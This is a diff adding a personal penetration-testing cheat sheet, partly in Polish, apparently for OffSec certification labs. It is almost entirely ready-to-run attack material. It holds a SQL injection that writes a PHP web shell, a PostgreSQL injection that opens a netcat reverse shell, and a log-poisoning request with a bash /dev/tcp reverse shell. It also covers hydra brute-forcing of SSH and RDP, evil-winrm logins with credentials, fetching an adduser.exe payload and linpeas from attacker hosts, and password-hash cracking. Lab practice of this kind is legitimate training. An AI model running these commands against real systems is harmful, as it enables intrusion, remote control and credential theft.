@@ -1,0 +1,88 @@
+rlwrap nc 192.168.221.220 4444
+
+
+enumeracje smb
+nmap --script smb-enum-shares.nse -p445 192.168.211.10
+
+Smbclient //192.168.211.10/Users -N
+_______________________
+SMB Server:
+impacket-smbserver files . -smb2support
+_______________________
+RDP:
+xfreerdp /v:192.168.197.196 /u:offsec /p:lab 
+
+______________________
+
+sql injection parametr w burp:
+MYSQL:
+mail-list=' union select null,null,null,null, "<?php system($_GET['cmd']);?>",null into outfile "/var/www/html/web.php" -- /
+
+POSTGRES:
+weight=120&height=130';  CREATE Table demo(t text)  ; COPY demo FROM PROGRAM 'nc 192.168.45.179 9001 -c bash'; -- /
+
+____________________________________
+LOG POSSOINIG
+____________________________________
+GET /meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log&cmd=bash+-c+"bash+-i+>%26+/dev/tcp/192.168.45.220/9001+0>%261" HTTP/1.1
+Host: mountaindesserts.com
+
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.110 Safari/537.36 <?php echo system($_GET['cmd']); ?>
+Accept: 
+
+GET /meteor/index.php?page=c:/xampp/apache/logs/access.log&cmd=type+hopefullynobodyfindsthisfilebecauseitssupersecret.txt HTTP/1.1
+
+
+____________________________________
+PASSWORD CRACK
+____________________________________
+sudo hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.50.201
+sudo hydra -l nadine -P /usr/share/wordlists/rockyou.txt -s 3389 rdp://192.168.194.227
+____________________________________
+WP SCAN
+____________________________________
+wpscan --api-token apitoken212312 --update 
+wpscan --url 192.168.212.47 --api-token apitoken212312 
+
+____________________________________
+WINDOWS REMOTE SHELL
+____________________________________
+evil-winrm -i 192.168.50.220 -u daveadmin -p "qwertqwertqwert123\!\!"
+
+____________________________________
+WINDOWS Process
+____________________________________
+Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'} | % {icacls $_.PathName}
+
+____________________________________
+PowerShell Pobieranie Plikow
+____________________________________
+python3 -m http.server 80
+iwr -uri http://192.168.119.3/adduser.exe -Outfile adduser.exe
+
+____________________________________
+powershell -ep bypass
+
+
+nmap -sV --script vuln  192.168.191.144 -p 80
+
+____________________________________
+git dumper
+____________________________________
+python git_dumper.py http://192.168.216.144/.git/ dumpe
+cd dumpe                                                                                        
+git show
+
+
+curl http://192.168.45.223/linpeas.sh -O linpeas.sh
+./linpeas.sh -a > linpeas_out.txt
+
+zip2john sitebackup3.zip > hash.txt
+john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+
+NMAP UDP
+sudo nmap -sU 192.168.248.145  
+echo "version" | nc 192.168.238.143 3003
+
+
+
